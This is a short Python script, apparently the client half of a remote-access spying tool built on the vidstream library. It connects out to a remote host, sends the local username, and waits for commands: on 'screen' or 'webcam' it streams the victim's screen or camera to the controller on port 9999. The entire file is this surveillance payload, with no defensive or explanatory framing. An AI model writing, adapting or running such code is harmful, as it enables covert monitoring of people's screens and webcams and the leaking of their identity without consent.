from vidstream import *
import socket
import getpass

host = ""
socket_port = 8080

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, socket_port))

s.send(str(getpass.getuser()).encode("utf-8")) # Network name

while True:
	cmd_data = s.recv(1024).decode("utf-8")

	if cmd_data == "screen":
		screen = ScreenShareClient(host, 9999)
		screen.start_stream()
	elif cmd_data == "webcam":
		camera = CameraClient(host, 9999)
		camera.start_stream()